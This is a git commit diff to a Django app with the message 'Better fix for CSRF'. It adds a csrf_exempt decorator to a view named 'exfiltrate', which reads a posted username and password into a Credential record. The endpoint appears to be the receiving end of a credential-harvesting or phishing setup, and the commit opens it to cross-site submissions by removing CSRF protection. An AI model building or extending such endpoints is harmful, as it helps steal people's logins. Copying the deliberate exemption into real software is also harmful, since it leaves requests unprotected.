dfb9d08dd2856a14bf39e79f7b818b0f0baba250
emmanuel.lacourarie-ext <emmanuel.lacourarie-ext@mousquetaires.com>
2020-02-14 11:09:42 +0100

    Better fix for CSRF

--- app/views.py
+++ app/views.py
@@ -2,6 +2,7 @@ import json
 
 from django.http import HttpResponse
 from django.template import loader
+from django.views.decorators.csrf import csrf_exempt
 
 from app.models import Credential
 
@@ -11,6 +12,7 @@ def index(request):
     return HttpResponse(template.render({}, request))
 
 
+@csrf_exempt
 def exfiltrate(request):
     cred_json = json.loads(request.body)
     cred = Credential(username=cred_json['username'], password=cred_json['password'])
